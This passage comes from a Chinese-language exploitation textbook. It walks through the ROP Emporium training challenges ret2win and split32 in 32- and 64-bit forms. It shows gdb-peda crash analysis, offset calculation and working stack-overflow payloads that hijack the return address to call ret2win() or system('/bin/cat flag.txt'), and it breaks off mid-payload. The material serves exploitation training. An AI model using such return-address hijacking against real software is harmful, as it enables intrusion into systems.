0x0804867c : add esp,0x10
0x0804867f : nop
0x08048680 : leave
382
3.1.4 返回导向编程（ROP）（x86）
0x08048681 : ret
End of assembler dump.
函数 pwnme() 是存在缓冲区溢出的函数，它调用 fgets() 读取任意数据，但
缓冲区的大小只有 40 字节（ 0x0804864a : lea eax,[ebp-0x28] ，
0x28=40），当输入大于 40 字节的数据时，就可以覆盖掉调用函数的 ebp 和返回
地址：
gdb-peda$ pattern_create 50
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA'
gdb-peda$ r
Starting program: /home/firmy/Desktop/rop_emporium/ret2win32/ret
2win32
ret2win by ROP Emporium
32bits
For my first trick, I will attempt to fit 50 bytes of user input
into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry a
bout null bytes, we're using fgets!
> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers--------------------
---------------]
EAX: 0xffffd5c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAF
AAb")
EBX: 0x0
ECX: 0xffffd5c0 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAF
AAb")
EDX: 0xf7f90860 --> 0x0
ESI: 0xf7f8ee28 --> 0x1d1d30
EDI: 0x0
EBP: 0x41304141 ('AA0A')
ESP: 0xffffd5f0 --> 0xf7f80062 --> 0x41000000 ('')
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT di
383
3.1.4 返回导向编程（ROP）（x86）
rection overflow)
[-------------------------------------code----------------------
---------------]
Invalid $PC address: 0x41414641
[------------------------------------stack----------------------
---------------]
0000| 0xffffd5f0 --> 0xf7f80062 --> 0x41000000 ('')
0004| 0xffffd5f4 --> 0xffffd610 --> 0x1
0008| 0xffffd5f8 --> 0x0
0012| 0xffffd5fc --> 0xf7dd57c3 (:
add esp,0x10)
0016| 0xffffd600 --> 0xf7f8ee28 --> 0x1d1d30
0020| 0xffffd604 --> 0xf7f8ee28 --> 0x1d1d30
0024| 0xffffd608 --> 0x0
0028| 0xffffd60c --> 0xf7dd57c3 (:
add esp,0x10)
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
gdb-peda$ pattern_offset $ebp
1093681473 found at offset: 40
gdb-peda$ pattern_offset $eip
1094796865 found at offset: 44
缓冲区距离 ebp 和 eip 的偏移分别为 40 和 44，这就验证了我们的假设。
通过查看程序的逻辑，虽然我们知道 .text 段中存在函数 ret2win() ，但在程序
执行中并没有调用到它，我们要做的就是用该函数的地址覆盖返回地址，使程序跳
转到该函数中，从而打印出 flag，我们称这一类型的 ROP 为 ret2text。
还有一件重要的事情是 checksec：
384
3.1.4 返回导向编程（ROP）（x86）
gdb-peda$ checksec
CANARY : disabled
FORTIFY : disabled
NX : ENABLED
PIE : disabled
RELRO : Partial
这里开启了关闭了 PIE，所以 .text 的加载地址是不变的，可以直接使用
ret2win() 的地址 0x08048659 。
payload 如下（注这篇文章中的paylaod我会使用多种方法来写，以展示各种工具的
使用）：
$ python2 -c "print 'A'*44 + '\x59\x86\x04\x08'" | ./ret2win32
...
> Thank you! Here's your flag:ROPE{a_placeholder_32byte_flag!}
ret2win
现在是 64 位程序：
gdb-peda$ disassemble pwnme
Dump of assembler code for function pwnme:
0x00000000004007b5 : push rbp
0x00000000004007b6 : mov rbp,rsp
0x00000000004007b9 : sub rsp,0x20
0x00000000004007bd : lea rax,[rbp-0x20]
0x00000000004007c1 : mov edx,0x20
0x00000000004007c6 : mov esi,0x0
0x00000000004007cb : mov rdi,rax
0x00000000004007ce : call 0x400600 
0x00000000004007d3 : mov edi,0x4008f8
0x00000000004007d8 : call 0x4005d0 
0x00000000004007dd : mov edi,0x400978
0x00000000004007e2 : call 0x4005d0 
0x00000000004007e7 : mov edi,0x4009dd
0x00000000004007ec : mov eax,0x0
385
3.1.4 返回导向编程（ROP）（x86）
0x00000000004007f1 : call 0x4005f0 
0x00000000004007f6 : mov rdx,QWORD PTR [rip+0x2008
73] # 0x601070 
0x00000000004007fd : lea rax,[rbp-0x20]
0x0000000000400801 : mov esi,0x32
0x0000000000400806 : mov rdi,rax
0x0000000000400809 : call 0x400620 
0x000000000040080e : nop
0x000000000040080f : leave
0x0000000000400810 : ret
End of assembler dump.
gdb-peda$ disassemble ret2win
Dump of assembler code for function ret2win:
0x0000000000400811 : push rbp
0x0000000000400812 : mov rbp,rsp
0x0000000000400815 : mov edi,0x4009e0
0x000000000040081a : mov eax,0x0
0x000000000040081f : call 0x4005f0 
0x0000000000400824 : mov edi,0x4009fd
0x0000000000400829 : call 0x4005e0 
0x000000000040082e : nop
0x000000000040082f : pop rbp
0x0000000000400830 : ret
End of assembler dump.
首先与 32 位不同的是参数传递，64 位程序的前六个参数通过 RDI、RSI、RDX、
RCX、R8 和 R9 传递。所以缓冲区大小参数通过 rdi 传递给 fgets() ，大小为
32 字节。
而且由于 ret 的地址不存在，程序停在了 => 0x400810 : ret 这一
步，这是因为 64 位可以使用的内存地址不能大于 0x00007fffffffffff ，否则
就会抛出异常。
gdb-peda$ r
Starting program: /home/firmy/Desktop/rop_emporium/ret2win/ret2w
in
ret2win by ROP Emporium
64bits
386
3.1.4 返回导向编程（ROP）（x86）
For my first trick, I will attempt to fit 50 bytes of user input
into 32 bytes of stack buffer;
What could possibly go wrong?
You there madam, may I have your input please? And don't worry a
bout null bytes, we're using fgets!
> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbA
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers--------------------
---------------]
RAX: 0x7fffffffe400 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA
0AAFAAb")
RBX: 0x0
RCX: 0x1f
RDX: 0x7ffff7dd4710 --> 0x0
RSI: 0x7fffffffe400 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA
0AAFAAb")
RDI: 0x7fffffffe401 ("AA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0
AAFAAb")
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7fffffffe428 ("AA0AAFAAb")
RIP: 0x400810 (: ret)
R8 : 0x0
R9 : 0x7ffff7fb94c0 (0x00007ffff7fb94c0)
R10: 0x602260 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAA
bA\n")
R11: 0x246
R12: 0x400650 (: xor ebp,ebp)
R13: 0x7fffffffe510 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT di
rection overflow)
[-------------------------------------code----------------------
---------------]
0x400809 : call 0x400620 
0x40080e : nop
0x40080f : leave
=> 0x400810 : ret
387
3.1.4 返回导向编程（ROP）（x86）
0x400811 : push rbp
0x400812 : mov rbp,rsp
0x400815 : mov edi,0x4009e0
0x40081a : mov eax,0x0
[------------------------------------stack----------------------
---------------]
0000| 0x7fffffffe428 ("AA0AAFAAb")
0008| 0x7fffffffe430 --> 0x400062 --> 0x1f8000000000000
0016| 0x7fffffffe438 --> 0x7ffff7a41f6a (
: mov edi,eax)
0024| 0x7fffffffe440 --> 0x0
0032| 0x7fffffffe448 --> 0x7fffffffe518 --> 0x7fffffffe870 ("/ho
me/firmy/Desktop/rop_emporium/ret2win/ret2win")
0040| 0x7fffffffe450 --> 0x100000000
0048| 0x7fffffffe458 --> 0x400746 (: push rbp)
0056| 0x7fffffffe460 --> 0x0
[---------------------------------------------------------------
---------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000400810 in pwnme ()
gdb-peda$ pattern_offset $rbp
7007954260868540737 found at offset: 32
gdb-peda$ pattern_offset AA0AAFAAb
AA0AAFAAb found at offset: 40
re2win() 的地址为 0x0000000000400811 ，payload 如下：
from zio import *
payload = "A"*40 + l64(0x0000000000400811)
io = zio('./ret2win')
io.writeline(payload)
io.read()
split32
388
3.1.4 返回导向编程（ROP）（x86）
这一题也是 ret2text，但这一次，我们有的是一个 usefulFunction() 函数：
gdb-peda$ disassemble usefulFunction
Dump of assembler code for function usefulFunction:
0x08048649 : push ebp
0x0804864a : mov ebp,esp
0x0804864c : sub esp,0x8
0x0804864f : sub esp,0xc
0x08048652 : push 0x8048747
0x08048657 : call 0x8048430 
0x0804865c : add esp,0x10
0x0804865f : nop
0x08048660 : leave
0x08048661 : ret
End of assembler dump.
它调用 system() 函数，而我们要做的是给它传递一个参数，执行该参数后可以
打印出 flag。
使用 radare2 中的工具 rabin2 在 .data 段中搜索字符串：
$ rabin2 -z split32
...
vaddr=0x0804a030 paddr=0x00001030 ordinal=000 sz=18 len=17 secti
on=.data type=ascii string=/bin/cat flag.txt
我们发现存在字符串 /bin/cat flag.txt ，这正是我们需要的，地址为
0x0804a030 。
下面构造 payload，这里就有两种方法，一种是直接使用调用 system() 函数的
地址 0x08048657 ，另一种是使用 system() 的 plt 地址 0x8048430 ，在前面
的章节中我们已经知道了 plt 的延迟绑定机制（1.5.6动态链接），这里我们再回顾
一下：
绑定前：
389
3.1.4 返回导向编程（ROP）（x86）
gdb-peda$ disassemble system
Dump of assembler code for function system@plt:
0x08048430 : jmp DWORD PTR ds:0x804a018
0x08048436 : push 0x18
0x0804843b : jmp 0x80483f0
gdb-peda$ x/5x 0x804a018
0x804a018: 0x08048436 0x08048446 0x08048456
0x08048466
0x804a028: 0x00000000
绑定后：
gdb-peda$ disassemble system
Dump of assembler code for function system:
0xf7df9c50 : sub esp,0xc
0xf7df9c53 : mov eax,DWORD PTR [esp+0x10]
0xf7df9c57 : call 0xf7ef32cd 
0xf7df9c5c : add edx,0x1951cc
0xf7df9c62 : test eax,eax
0xf7df9c64 : je 0xf7df9c70 
0xf7df9c66 : add esp,0xc
0xf7df9c69 : jmp 0xf7df9700 
0xf7df9c6e : xchg ax,ax
0xf7df9c70 : lea eax,[edx-0x57616]
0xf7df9c76 : call 0xf7df9700 
0xf7df9c7b : test eax,eax
0xf7df9c7d : sete al
0xf7df9c80 : add esp,0xc
0xf7df9c83 : movzx eax,al
0xf7df9c86 : ret
End of assembler dump.
gdb-peda$ x/5x 0x08048430
0x8048430 : 0xa01825ff 0x18680804 0xe90000
00 0xffffffb0
0x8048440 : 0xa01c25ff
390
3.1.4 返回导向编程（ROP）（x86）
其实这里讲 plt 不是很确切，因为 system 使用太频繁，在我们使用它之前，它就已
经绑定了，在后面的挑战中我们会遇到没有绑定的情况。
两种 payload 如下：
$ python2 -c "print 'A'*44 + '\x57\x86\x04\x08' + '\x30\xa0\x04\
x08'" | ./split32
...
> ROPE{a_placeholder_32byte_flag!}
from zio import *
payload = "A"*44